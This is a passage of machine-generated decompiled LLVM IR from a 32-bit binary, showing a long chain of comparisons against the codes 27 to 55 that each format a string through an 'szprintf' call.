  br i1 %v1_804a190, label %dec_label_pc_804a1bc, label %dec_label_pc_804a192

dec_label_pc_804a192:                             ; preds = %dec_label_pc_804a18c
  %v0_804a192 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a192 = zext i8 %v0_804a192 to i32
  store i32 %v1_804a192, i32* @edx, align 4
  %v0_804a19e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a19e = zext i8 %v0_804a19e to i32
  %v2_804a1ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1ad, i32* @ebx, align 4
  %v5_804a1b4 = call i32 @szprintf(i32 %v2_804a1ad, i32 ptrtoint ([12 x i8]* @global_var_8057298.67 to i32), i32 %v1_804a19e, i32 %v1_804a192)
  br label %dec_label_pc_804a1bc

dec_label_pc_804a1bc:                             ; preds = %dec_label_pc_804a18c, %dec_label_pc_804a192
  %v12_804a1bc = icmp eq i32 %v11_8049ca7, 27
  %v1_804a1c0 = icmp eq i1 %v12_804a1bc, false
  br i1 %v1_804a1c0, label %dec_label_pc_804a1ec, label %dec_label_pc_804a1c2

dec_label_pc_804a1c2:                             ; preds = %dec_label_pc_804a1bc
  %v0_804a1c2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a1c2 = zext i8 %v0_804a1c2 to i32
  store i32 %v1_804a1c2, i32* @edx, align 4
  %v0_804a1ce = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a1ce = zext i8 %v0_804a1ce to i32
  %v2_804a1dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1dd, i32* @ebx, align 4
  %v5_804a1e4 = call i32 @szprintf(i32 %v2_804a1dd, i32 ptrtoint ([13 x i8]* @global_var_80572a4.68 to i32), i32 %v1_804a1ce, i32 %v1_804a1c2)
  br label %dec_label_pc_804a1ec

dec_label_pc_804a1ec:                             ; preds = %dec_label_pc_804a1bc, %dec_label_pc_804a1c2
  %v12_804a1ec = icmp eq i32 %v11_8049ca7, 28
  %v1_804a1f0 = icmp eq i1 %v12_804a1ec, false
  br i1 %v1_804a1f0, label %dec_label_pc_804a21c, label %dec_label_pc_804a1f2

dec_label_pc_804a1f2:                             ; preds = %dec_label_pc_804a1ec
  %v0_804a1f2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a1f2 = zext i8 %v0_804a1f2 to i32
  store i32 %v1_804a1f2, i32* @edx, align 4
  %v0_804a1fe = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a1fe = zext i8 %v0_804a1fe to i32
  %v2_804a20d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a20d, i32* @ebx, align 4
  %v5_804a214 = call i32 @szprintf(i32 %v2_804a20d, i32 ptrtoint ([13 x i8]* @global_var_80572b1.69 to i32), i32 %v1_804a1fe, i32 %v1_804a1f2)
  br label %dec_label_pc_804a21c

dec_label_pc_804a21c:                             ; preds = %dec_label_pc_804a1ec, %dec_label_pc_804a1f2
  %v12_804a21c = icmp eq i32 %v11_8049ca7, 29
  %v1_804a220 = icmp eq i1 %v12_804a21c, false
  br i1 %v1_804a220, label %dec_label_pc_804a24c, label %dec_label_pc_804a222

dec_label_pc_804a222:                             ; preds = %dec_label_pc_804a21c
  %v0_804a222 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a222 = zext i8 %v0_804a222 to i32
  store i32 %v1_804a222, i32* @edx, align 4
  %v0_804a22e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a22e = zext i8 %v0_804a22e to i32
  %v2_804a23d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a23d, i32* @ebx, align 4
  %v5_804a244 = call i32 @szprintf(i32 %v2_804a23d, i32 ptrtoint ([12 x i8]* @global_var_80572be.70 to i32), i32 %v1_804a22e, i32 %v1_804a222)
  br label %dec_label_pc_804a24c

dec_label_pc_804a24c:                             ; preds = %dec_label_pc_804a21c, %dec_label_pc_804a222
  %v12_804a24c = icmp eq i32 %v11_8049ca7, 30
  %v1_804a250 = icmp eq i1 %v12_804a24c, false
  br i1 %v1_804a250, label %dec_label_pc_804a27c, label %dec_label_pc_804a252

dec_label_pc_804a252:                             ; preds = %dec_label_pc_804a24c
  %v0_804a252 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a252 = zext i8 %v0_804a252 to i32
  store i32 %v1_804a252, i32* @edx, align 4
  %v0_804a25e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a25e = zext i8 %v0_804a25e to i32
  %v2_804a26d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a26d, i32* @ebx, align 4
  %v5_804a274 = call i32 @szprintf(i32 %v2_804a26d, i32 ptrtoint ([13 x i8]* @global_var_80572ca.71 to i32), i32 %v1_804a25e, i32 %v1_804a252)
  br label %dec_label_pc_804a27c

dec_label_pc_804a27c:                             ; preds = %dec_label_pc_804a24c, %dec_label_pc_804a252
  %v12_804a27c = icmp eq i32 %v11_8049ca7, 31
  %v1_804a280 = icmp eq i1 %v12_804a27c, false
  br i1 %v1_804a280, label %dec_label_pc_804a2ac, label %dec_label_pc_804a282

dec_label_pc_804a282:                             ; preds = %dec_label_pc_804a27c
  %v0_804a282 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a282 = zext i8 %v0_804a282 to i32
  store i32 %v1_804a282, i32* @edx, align 4
  %v0_804a28e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a28e = zext i8 %v0_804a28e to i32
  %v2_804a29d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a29d, i32* @ebx, align 4
  %v5_804a2a4 = call i32 @szprintf(i32 %v2_804a29d, i32 ptrtoint ([12 x i8]* @global_var_80572d7.72 to i32), i32 %v1_804a28e, i32 %v1_804a282)
  br label %dec_label_pc_804a2ac

dec_label_pc_804a2ac:                             ; preds = %dec_label_pc_804a27c, %dec_label_pc_804a282
  %v9_804a2ac = icmp eq i32 %v11_8049ca7, 32
  %v1_804a2b0 = icmp eq i1 %v9_804a2ac, false
  br i1 %v1_804a2b0, label %dec_label_pc_804a2dc, label %dec_label_pc_804a2b2

dec_label_pc_804a2b2:                             ; preds = %dec_label_pc_804a2ac
  %v0_804a2b2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a2b2 = zext i8 %v0_804a2b2 to i32
  store i32 %v1_804a2b2, i32* @edx, align 4
  %v0_804a2be = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a2be = zext i8 %v0_804a2be to i32
  %v2_804a2cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2cd, i32* @ebx, align 4
  %v5_804a2d4 = call i32 @szprintf(i32 %v2_804a2cd, i32 ptrtoint ([11 x i8]* @global_var_80572e3.73 to i32), i32 %v1_804a2be, i32 %v1_804a2b2)
  br label %dec_label_pc_804a2dc

dec_label_pc_804a2dc:                             ; preds = %dec_label_pc_804a2ac, %dec_label_pc_804a2b2
  %v12_804a2dc = icmp eq i32 %v11_8049ca7, 33
  %v1_804a2e0 = icmp eq i1 %v12_804a2dc, false
  br i1 %v1_804a2e0, label %dec_label_pc_804a30c, label %dec_label_pc_804a2e2

dec_label_pc_804a2e2:                             ; preds = %dec_label_pc_804a2dc
  %v0_804a2e2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a2e2 = zext i8 %v0_804a2e2 to i32
  store i32 %v1_804a2e2, i32* @edx, align 4
  %v0_804a2ee = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a2ee = zext i8 %v0_804a2ee to i32
  %v2_804a2fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2fd, i32* @ebx, align 4
  %v5_804a304 = call i32 @szprintf(i32 %v2_804a2fd, i32 ptrtoint ([12 x i8]* @global_var_80572ee.74 to i32), i32 %v1_804a2ee, i32 %v1_804a2e2)
  br label %dec_label_pc_804a30c

dec_label_pc_804a30c:                             ; preds = %dec_label_pc_804a2dc, %dec_label_pc_804a2e2
  %v12_804a30c = icmp eq i32 %v11_8049ca7, 34
  %v1_804a310 = icmp eq i1 %v12_804a30c, false
  br i1 %v1_804a310, label %dec_label_pc_804a33c, label %dec_label_pc_804a312

dec_label_pc_804a312:                             ; preds = %dec_label_pc_804a30c
  %v0_804a312 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a312 = zext i8 %v0_804a312 to i32
  store i32 %v1_804a312, i32* @edx, align 4
  %v0_804a31e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a31e = zext i8 %v0_804a31e to i32
  %v2_804a32d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a32d, i32* @ebx, align 4
  %v5_804a334 = call i32 @szprintf(i32 %v2_804a32d, i32 ptrtoint ([12 x i8]* @global_var_80572fa.75 to i32), i32 %v1_804a31e, i32 %v1_804a312)
  br label %dec_label_pc_804a33c

dec_label_pc_804a33c:                             ; preds = %dec_label_pc_804a30c, %dec_label_pc_804a312
  %v12_804a33c = icmp eq i32 %v11_8049ca7, 35
  %v1_804a340 = icmp eq i1 %v12_804a33c, false
  br i1 %v1_804a340, label %dec_label_pc_804a36c, label %dec_label_pc_804a342

dec_label_pc_804a342:                             ; preds = %dec_label_pc_804a33c
  %v0_804a342 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a342 = zext i8 %v0_804a342 to i32
  store i32 %v1_804a342, i32* @edx, align 4
  %v0_804a34e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a34e = zext i8 %v0_804a34e to i32
  %v2_804a35d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a35d, i32* @ebx, align 4
  %v5_804a364 = call i32 @szprintf(i32 %v2_804a35d, i32 ptrtoint ([12 x i8]* @global_var_8057306.76 to i32), i32 %v1_804a34e, i32 %v1_804a342)
  br label %dec_label_pc_804a36c

dec_label_pc_804a36c:                             ; preds = %dec_label_pc_804a33c, %dec_label_pc_804a342
  %v12_804a36c = icmp eq i32 %v11_8049ca7, 36
  %v1_804a370 = icmp eq i1 %v12_804a36c, false
  br i1 %v1_804a370, label %dec_label_pc_804a39c, label %dec_label_pc_804a372

dec_label_pc_804a372:                             ; preds = %dec_label_pc_804a36c
  %v0_804a372 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a372 = zext i8 %v0_804a372 to i32
  store i32 %v1_804a372, i32* @edx, align 4
  %v0_804a37e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a37e = zext i8 %v0_804a37e to i32
  %v2_804a38d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a38d, i32* @ebx, align 4
  %v5_804a394 = call i32 @szprintf(i32 %v2_804a38d, i32 ptrtoint ([12 x i8]* @global_var_8057312.77 to i32), i32 %v1_804a37e, i32 %v1_804a372)
  br label %dec_label_pc_804a39c

dec_label_pc_804a39c:                             ; preds = %dec_label_pc_804a36c, %dec_label_pc_804a372
  %v12_804a39c = icmp eq i32 %v11_8049ca7, 37
  %v1_804a3a0 = icmp eq i1 %v12_804a39c, false
  br i1 %v1_804a3a0, label %dec_label_pc_804a3cc, label %dec_label_pc_804a3a2

dec_label_pc_804a3a2:                             ; preds = %dec_label_pc_804a39c
  %v0_804a3a2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a3a2 = zext i8 %v0_804a3a2 to i32
  store i32 %v1_804a3a2, i32* @edx, align 4
  %v0_804a3ae = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a3ae = zext i8 %v0_804a3ae to i32
  %v2_804a3bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3bd, i32* @ebx, align 4
  %v5_804a3c4 = call i32 @szprintf(i32 %v2_804a3bd, i32 ptrtoint ([12 x i8]* @global_var_805731e.78 to i32), i32 %v1_804a3ae, i32 %v1_804a3a2)
  br label %dec_label_pc_804a3cc

dec_label_pc_804a3cc:                             ; preds = %dec_label_pc_804a39c, %dec_label_pc_804a3a2
  %v12_804a3cc = icmp eq i32 %v11_8049ca7, 38
  %v1_804a3d0 = icmp eq i1 %v12_804a3cc, false
  br i1 %v1_804a3d0, label %dec_label_pc_804a3fc, label %dec_label_pc_804a3d2

dec_label_pc_804a3d2:                             ; preds = %dec_label_pc_804a3cc
  %v0_804a3d2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a3d2 = zext i8 %v0_804a3d2 to i32
  store i32 %v1_804a3d2, i32* @edx, align 4
  %v0_804a3de = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a3de = zext i8 %v0_804a3de to i32
  %v2_804a3ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3ed, i32* @ebx, align 4
  %v5_804a3f4 = call i32 @szprintf(i32 %v2_804a3ed, i32 ptrtoint ([13 x i8]* @global_var_805732a.79 to i32), i32 %v1_804a3de, i32 %v1_804a3d2)
  br label %dec_label_pc_804a3fc

dec_label_pc_804a3fc:                             ; preds = %dec_label_pc_804a3cc, %dec_label_pc_804a3d2
  %v12_804a3fc = icmp eq i32 %v11_8049ca7, 39
  %v1_804a400 = icmp eq i1 %v12_804a3fc, false
  br i1 %v1_804a400, label %dec_label_pc_804a42c, label %dec_label_pc_804a402

dec_label_pc_804a402:                             ; preds = %dec_label_pc_804a3fc
  %v0_804a402 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a402 = zext i8 %v0_804a402 to i32
  store i32 %v1_804a402, i32* @edx, align 4
  %v0_804a40e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a40e = zext i8 %v0_804a40e to i32
  %v2_804a41d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a41d, i32* @ebx, align 4
  %v5_804a424 = call i32 @szprintf(i32 %v2_804a41d, i32 ptrtoint ([13 x i8]* @global_var_8057337.80 to i32), i32 %v1_804a40e, i32 %v1_804a402)
  br label %dec_label_pc_804a42c

dec_label_pc_804a42c:                             ; preds = %dec_label_pc_804a3fc, %dec_label_pc_804a402
  %v12_804a42c = icmp eq i32 %v11_8049ca7, 40
  %v1_804a430 = icmp eq i1 %v12_804a42c, false
  br i1 %v1_804a430, label %dec_label_pc_804a45c, label %dec_label_pc_804a432

dec_label_pc_804a432:                             ; preds = %dec_label_pc_804a42c
  %v0_804a432 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a432 = zext i8 %v0_804a432 to i32
  store i32 %v1_804a432, i32* @edx, align 4
  %v0_804a43e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a43e = zext i8 %v0_804a43e to i32
  %v2_804a44d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a44d, i32* @ebx, align 4
  %v5_804a454 = call i32 @szprintf(i32 %v2_804a44d, i32 ptrtoint ([13 x i8]* @global_var_805732a.79 to i32), i32 %v1_804a43e, i32 %v1_804a432)
  br label %dec_label_pc_804a45c

dec_label_pc_804a45c:                             ; preds = %dec_label_pc_804a42c, %dec_label_pc_804a432
  %v12_804a45c = icmp eq i32 %v11_8049ca7, 41
  %v1_804a460 = icmp eq i1 %v12_804a45c, false
  br i1 %v1_804a460, label %dec_label_pc_804a48c, label %dec_label_pc_804a462

dec_label_pc_804a462:                             ; preds = %dec_label_pc_804a45c
  %v0_804a462 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a462 = zext i8 %v0_804a462 to i32
  store i32 %v1_804a462, i32* @edx, align 4
  %v0_804a46e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a46e = zext i8 %v0_804a46e to i32
  %v2_804a47d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a47d, i32* @ebx, align 4
  %v5_804a484 = call i32 @szprintf(i32 %v2_804a47d, i32 ptrtoint ([11 x i8]* @global_var_8057344.81 to i32), i32 %v1_804a46e, i32 %v1_804a462)
  br label %dec_label_pc_804a48c

dec_label_pc_804a48c:                             ; preds = %dec_label_pc_804a45c, %dec_label_pc_804a462
  %v12_804a48c = icmp eq i32 %v11_8049ca7, 42
  %v1_804a490 = icmp eq i1 %v12_804a48c, false
  br i1 %v1_804a490, label %dec_label_pc_804a4bc, label %dec_label_pc_804a492

dec_label_pc_804a492:                             ; preds = %dec_label_pc_804a48c
  %v0_804a492 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a492 = zext i8 %v0_804a492 to i32
  store i32 %v1_804a492, i32* @edx, align 4
  %v0_804a49e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a49e = zext i8 %v0_804a49e to i32
  %v2_804a4ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4ad, i32* @ebx, align 4
  %v5_804a4b4 = call i32 @szprintf(i32 %v2_804a4ad, i32 ptrtoint ([12 x i8]* @global_var_805734f.82 to i32), i32 %v1_804a49e, i32 %v1_804a492)
  br label %dec_label_pc_804a4bc

dec_label_pc_804a4bc:                             ; preds = %dec_label_pc_804a48c, %dec_label_pc_804a492
  %v12_804a4bc = icmp eq i32 %v11_8049ca7, 43
  %v1_804a4c0 = icmp eq i1 %v12_804a4bc, false
  br i1 %v1_804a4c0, label %dec_label_pc_804a4ec, label %dec_label_pc_804a4c2

dec_label_pc_804a4c2:                             ; preds = %dec_label_pc_804a4bc
  %v0_804a4c2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a4c2 = zext i8 %v0_804a4c2 to i32
  store i32 %v1_804a4c2, i32* @edx, align 4
  %v0_804a4ce = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a4ce = zext i8 %v0_804a4ce to i32
  %v2_804a4dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4dd, i32* @ebx, align 4
  %v5_804a4e4 = call i32 @szprintf(i32 %v2_804a4dd, i32 ptrtoint ([13 x i8]* @global_var_805735b.83 to i32), i32 %v1_804a4ce, i32 %v1_804a4c2)
  br label %dec_label_pc_804a4ec

dec_label_pc_804a4ec:                             ; preds = %dec_label_pc_804a4bc, %dec_label_pc_804a4c2
  %v12_804a4ec = icmp eq i32 %v11_8049ca7, 44
  %v1_804a4f0 = icmp eq i1 %v12_804a4ec, false
  br i1 %v1_804a4f0, label %dec_label_pc_804a51c, label %dec_label_pc_804a4f2

dec_label_pc_804a4f2:                             ; preds = %dec_label_pc_804a4ec
  %v0_804a4f2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a4f2 = zext i8 %v0_804a4f2 to i32
  store i32 %v1_804a4f2, i32* @edx, align 4
  %v0_804a4fe = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a4fe = zext i8 %v0_804a4fe to i32
  %v2_804a50d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a50d, i32* @ebx, align 4
  %v5_804a514 = call i32 @szprintf(i32 %v2_804a50d, i32 ptrtoint ([12 x i8]* @global_var_8057368.84 to i32), i32 %v1_804a4fe, i32 %v1_804a4f2)
  br label %dec_label_pc_804a51c

dec_label_pc_804a51c:                             ; preds = %dec_label_pc_804a4ec, %dec_label_pc_804a4f2
  %v12_804a51c = icmp eq i32 %v11_8049ca7, 45
  %v1_804a520 = icmp eq i1 %v12_804a51c, false
  br i1 %v1_804a520, label %dec_label_pc_804a54c, label %dec_label_pc_804a522

dec_label_pc_804a522:                             ; preds = %dec_label_pc_804a51c
  %v0_804a522 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a522 = zext i8 %v0_804a522 to i32
  store i32 %v1_804a522, i32* @edx, align 4
  %v0_804a52e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a52e = zext i8 %v0_804a52e to i32
  %v2_804a53d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a53d, i32* @ebx, align 4
  %v5_804a544 = call i32 @szprintf(i32 %v2_804a53d, i32 ptrtoint ([13 x i8]* @global_var_8057374.85 to i32), i32 %v1_804a52e, i32 %v1_804a522)
  br label %dec_label_pc_804a54c

dec_label_pc_804a54c:                             ; preds = %dec_label_pc_804a51c, %dec_label_pc_804a522
  %v12_804a54c = icmp eq i32 %v11_8049ca7, 46
  %v1_804a550 = icmp eq i1 %v12_804a54c, false
  br i1 %v1_804a550, label %dec_label_pc_804a57c, label %dec_label_pc_804a552

dec_label_pc_804a552:                             ; preds = %dec_label_pc_804a54c
  %v0_804a552 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a552 = zext i8 %v0_804a552 to i32
  store i32 %v1_804a552, i32* @edx, align 4
  %v0_804a55e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a55e = zext i8 %v0_804a55e to i32
  %v2_804a56d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a56d, i32* @ebx, align 4
  %v5_804a574 = call i32 @szprintf(i32 %v2_804a56d, i32 ptrtoint ([13 x i8]* @global_var_8057381.86 to i32), i32 %v1_804a55e, i32 %v1_804a552)
  br label %dec_label_pc_804a57c

dec_label_pc_804a57c:                             ; preds = %dec_label_pc_804a54c, %dec_label_pc_804a552
  %v12_804a57c = icmp eq i32 %v11_8049ca7, 47
  %v1_804a580 = icmp eq i1 %v12_804a57c, false
  br i1 %v1_804a580, label %dec_label_pc_804a5ac, label %dec_label_pc_804a582

dec_label_pc_804a582:                             ; preds = %dec_label_pc_804a57c
  %v0_804a582 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a582 = zext i8 %v0_804a582 to i32
  store i32 %v1_804a582, i32* @edx, align 4
  %v0_804a58e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a58e = zext i8 %v0_804a58e to i32
  %v2_804a59d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a59d, i32* @ebx, align 4
  %v5_804a5a4 = call i32 @szprintf(i32 %v2_804a59d, i32 ptrtoint ([13 x i8]* @global_var_805738e.87 to i32), i32 %v1_804a58e, i32 %v1_804a582)
  br label %dec_label_pc_804a5ac

dec_label_pc_804a5ac:                             ; preds = %dec_label_pc_804a57c, %dec_label_pc_804a582
  %v9_804a5ac = icmp eq i32 %v11_8049ca7, 48
  %v1_804a5b0 = icmp eq i1 %v9_804a5ac, false
  br i1 %v1_804a5b0, label %dec_label_pc_804a5dc, label %dec_label_pc_804a5b2

dec_label_pc_804a5b2:                             ; preds = %dec_label_pc_804a5ac
  %v0_804a5b2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a5b2 = zext i8 %v0_804a5b2 to i32
  store i32 %v1_804a5b2, i32* @edx, align 4
  %v0_804a5be = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a5be = zext i8 %v0_804a5be to i32
  %v2_804a5cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5cd, i32* @ebx, align 4
  %v5_804a5d4 = call i32 @szprintf(i32 %v2_804a5cd, i32 ptrtoint ([12 x i8]* @global_var_805739b.88 to i32), i32 %v1_804a5be, i32 %v1_804a5b2)
  br label %dec_label_pc_804a5dc

dec_label_pc_804a5dc:                             ; preds = %dec_label_pc_804a5ac, %dec_label_pc_804a5b2
  %v12_804a5dc = icmp eq i32 %v11_8049ca7, 49
  %v1_804a5e0 = icmp eq i1 %v12_804a5dc, false
  br i1 %v1_804a5e0, label %dec_label_pc_804a60c, label %dec_label_pc_804a5e2

dec_label_pc_804a5e2:                             ; preds = %dec_label_pc_804a5dc
  %v0_804a5e2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a5e2 = zext i8 %v0_804a5e2 to i32
  store i32 %v1_804a5e2, i32* @edx, align 4
  %v0_804a5ee = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a5ee = zext i8 %v0_804a5ee to i32
  %v2_804a5fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5fd, i32* @ebx, align 4
  %v5_804a604 = call i32 @szprintf(i32 %v2_804a5fd, i32 ptrtoint ([12 x i8]* @global_var_80573a7.89 to i32), i32 %v1_804a5ee, i32 %v1_804a5e2)
  br label %dec_label_pc_804a60c

dec_label_pc_804a60c:                             ; preds = %dec_label_pc_804a5dc, %dec_label_pc_804a5e2
  %v12_804a60c = icmp eq i32 %v11_8049ca7, 50
  %v1_804a610 = icmp eq i1 %v12_804a60c, false
  br i1 %v1_804a610, label %dec_label_pc_804a63c, label %dec_label_pc_804a612

dec_label_pc_804a612:                             ; preds = %dec_label_pc_804a60c
  %v0_804a612 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a612 = zext i8 %v0_804a612 to i32
  store i32 %v1_804a612, i32* @edx, align 4
  %v0_804a61e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a61e = zext i8 %v0_804a61e to i32
  %v2_804a62d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a62d, i32* @ebx, align 4
  %v5_804a634 = call i32 @szprintf(i32 %v2_804a62d, i32 ptrtoint ([12 x i8]* @global_var_80573b3.90 to i32), i32 %v1_804a61e, i32 %v1_804a612)
  br label %dec_label_pc_804a63c

dec_label_pc_804a63c:                             ; preds = %dec_label_pc_804a60c, %dec_label_pc_804a612
  %v12_804a63c = icmp eq i32 %v11_8049ca7, 51
  %v1_804a640 = icmp eq i1 %v12_804a63c, false
  br i1 %v1_804a640, label %dec_label_pc_804a66c, label %dec_label_pc_804a642

dec_label_pc_804a642:                             ; preds = %dec_label_pc_804a63c
  %v0_804a642 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a642 = zext i8 %v0_804a642 to i32
  store i32 %v1_804a642, i32* @edx, align 4
  %v0_804a64e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a64e = zext i8 %v0_804a64e to i32
  %v2_804a65d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a65d, i32* @ebx, align 4
  %v5_804a664 = call i32 @szprintf(i32 %v2_804a65d, i32 ptrtoint ([13 x i8]* @global_var_80573bf.91 to i32), i32 %v1_804a64e, i32 %v1_804a642)
  br label %dec_label_pc_804a66c

dec_label_pc_804a66c:                             ; preds = %dec_label_pc_804a63c, %dec_label_pc_804a642
  %v12_804a66c = icmp eq i32 %v11_8049ca7, 52
  %v1_804a670 = icmp eq i1 %v12_804a66c, false
  br i1 %v1_804a670, label %dec_label_pc_804a69c, label %dec_label_pc_804a672

dec_label_pc_804a672:                             ; preds = %dec_label_pc_804a66c
  %v0_804a672 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a672 = zext i8 %v0_804a672 to i32
  store i32 %v1_804a672, i32* @edx, align 4
  %v0_804a67e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a67e = zext i8 %v0_804a67e to i32
  %v2_804a68d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a68d, i32* @ebx, align 4
  %v5_804a694 = call i32 @szprintf(i32 %v2_804a68d, i32 ptrtoint ([13 x i8]* @global_var_80573cc.92 to i32), i32 %v1_804a67e, i32 %v1_804a672)
  br label %dec_label_pc_804a69c

dec_label_pc_804a69c:                             ; preds = %dec_label_pc_804a66c, %dec_label_pc_804a672
  %v12_804a69c = icmp eq i32 %v11_8049ca7, 53
  %v1_804a6a0 = icmp eq i1 %v12_804a69c, false
  br i1 %v1_804a6a0, label %dec_label_pc_804a6cc, label %dec_label_pc_804a6a2

dec_label_pc_804a6a2:                             ; preds = %dec_label_pc_804a69c
  %v0_804a6a2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a6a2 = zext i8 %v0_804a6a2 to i32
  store i32 %v1_804a6a2, i32* @edx, align 4
  %v0_804a6ae = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a6ae = zext i8 %v0_804a6ae to i32
  %v2_804a6bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6bd, i32* @ebx, align 4
  %v5_804a6c4 = call i32 @szprintf(i32 %v2_804a6bd, i32 ptrtoint ([14 x i8]* @global_var_80573d9.93 to i32), i32 %v1_804a6ae, i32 %v1_804a6a2)
  br label %dec_label_pc_804a6cc

dec_label_pc_804a6cc:                             ; preds = %dec_label_pc_804a69c, %dec_label_pc_804a6a2
  %v12_804a6cc = icmp eq i32 %v11_8049ca7, 54
  %v1_804a6d0 = icmp eq i1 %v12_804a6cc, false
  br i1 %v1_804a6d0, label %dec_label_pc_804a6fc, label %dec_label_pc_804a6d2

dec_label_pc_804a6d2:                             ; preds = %dec_label_pc_804a6cc
  %v0_804a6d2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a6d2 = zext i8 %v0_804a6d2 to i32
  store i32 %v1_804a6d2, i32* @edx, align 4
  %v0_804a6de = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a6de = zext i8 %v0_804a6de to i32
  %v2_804a6ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6ed, i32* @ebx, align 4
  %v5_804a6f4 = call i32 @szprintf(i32 %v2_804a6ed, i32 ptrtoint ([13 x i8]* @global_var_80573e7.94 to i32), i32 %v1_804a6de, i32 %v1_804a6d2)
  br label %dec_label_pc_804a6fc

dec_label_pc_804a6fc:                             ; preds = %dec_label_pc_804a6cc, %dec_label_pc_804a6d2
  %v12_804a6fc = icmp eq i32 %v11_8049ca7, 55
  %v1_804a700 = icmp eq i1 %v12_804a6fc, false
  br i1 %v1_804a700, label %dec_label_pc_804a72c, label %dec_label_pc_804a702

dec_label_pc_804a702:                             ; preds = %dec_label_pc_804a6fc
  %v0_804a702 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804a702 = zext i8 %v0_804a702 to i32
  store i32 %v1_804a702, i32* @edx, align 4
  %v0_804a70e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804a70e = zext i8 %v0_804a70e to i32
  %v2_804a71d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a71d, i32* @ebx, align 4
  %v5_804a724 = call i32 @szprintf(i32 %v2_804a71d, i32 ptrtoint ([14 x i8]* @global_var_80573f4.95 to i32), i32 %v1_804a70e, i32 %v1_804a702)
  br label %dec_label_pc_804a72c

